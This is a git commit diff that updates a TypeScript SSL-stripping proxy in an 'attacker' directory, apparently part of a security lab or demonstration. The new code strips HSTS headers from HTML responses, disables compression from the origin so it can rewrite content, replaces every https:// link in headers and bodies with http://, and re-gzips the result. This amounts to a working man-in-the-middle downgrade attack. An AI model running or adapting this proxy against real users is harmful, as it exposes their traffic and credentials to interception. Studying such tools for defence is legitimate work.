952789219e356c9793af9d66e89e3c58b4ca79c0
evi0s <i@evi0s.com>
2024-04-12 01:56:08 -0400

    [attacker] update sslstrip.ts * fix content-encoding * replace https urls to http

--- attacker/sslstrip.ts
+++ attacker/sslstrip.ts
@@ -1,24 +1,60 @@
 import * as http from "http";
 import * as https from "https";
+import * as zlib from "zlib";
 
 const onRequest = (req: http.IncomingMessage, res: http.ServerResponse) => {
     console.log(`[server] got request, need to serve: ${req.headers.host}${req.url}`);
-    
+
     const requestURL = new URL(req.url, `http://${req.headers.host}`);
+    req.headers["Accept-Encoding"] = "identity";
     const options = {
         host: requestURL.host,
-	port: 443,
-	path: requestURL.pathname,
-	method: req.method,
-	headers: req.headers
+        port: 443,
+        path: requestURL.pathname,
+        method: req.method,
+        headers: req.headers
     };
 
     const proxy = https.request(options, (requestRes: http.IncomingMessage) => {
         console.log(`[proxy] proxy request got response, writing back to client...`);
-        res.writeHead(requestRes.statusCode, requestRes.headers);
-        requestRes.pipe(res, {
-            end: true
-        });
+        let newHeaders = requestRes.headers;
+        if ("content-type" in newHeaders && newHeaders['content-type'].substr(0, 9) == 'text/html') {
+            if ("strict-transport-security" in newHeaders) {
+                delete newHeaders["strict-transport-security"];
+            }
+            for (let header in newHeaders) {
+                if (newHeaders[header] instanceof Array) {
+                    newHeaders[header] = (<Array<string>> newHeaders[header]).map(i => i.replaceAll("https://", "http://"))
+                } else {
+                    newHeaders[header] = (<string>newHeaders[header]).replaceAll("https://", "http://");
+                }
+            }
+
+            const bodyChunks = new Array<Buffer>;
+            requestRes.on("data", (chunk: Buffer) => {
+                bodyChunks.push(chunk);
+            });
+
+            requestRes.on("end", () => {
+                const newBody = Buffer.concat(bodyChunks).toString().replaceAll("https://", "http://");
+                zlib.gzip(newBody, (error: Error, result: Buffer) => {
+                    if (error != null) {
+                        res.writeHead(500, { 'Content-Type': 'application/json' })
+                           .end(JSON.stringify({ message: "internal server error" }));
+                        return;
+                    }
+                    newHeaders["content-length"] = Buffer.byteLength(result).toString();
+                    newHeaders["content-encoding"] = "gzip";
+                    // write headers
+                    res.writeHead(requestRes.statusCode, newHeaders);
+                    // write body
+                    res.end(result);
+                });
+            });
+        } else {
+            res.writeHead(requestRes.statusCode, newHeaders);
+            requestRes.pipe(res, { end: true });
+        }
     });
 
     proxy.on('error', (e: Error) => {
